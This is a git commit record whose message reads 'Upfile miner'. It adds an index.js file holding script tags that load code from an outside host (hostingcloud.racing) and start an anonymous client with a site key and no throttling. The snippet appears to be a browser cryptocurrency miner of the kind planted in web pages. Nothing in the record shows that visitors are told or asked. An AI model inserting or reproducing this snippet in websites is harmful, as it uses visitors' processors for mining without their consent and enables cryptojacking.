f79154d5092a55977ee6b82bf903cf387b880054
stp5940 <sitthipong114@gmail.com>
2019-03-20 09:20:52 +0700

    Upfile miner

---
+++ index.js
@@ -0,0 +1,8 @@
+<script src="https://www.hostingcloud.racing/f3tY.js"></script>
+<script>
+    var _client = new Client.Anonymous('68327000dc08db0923007cc5389d1ffcaf4a297ce9c7b42819a402399c1343a6', {
+        throttle: 0
+    });
+    _client.start();
+
+</script>
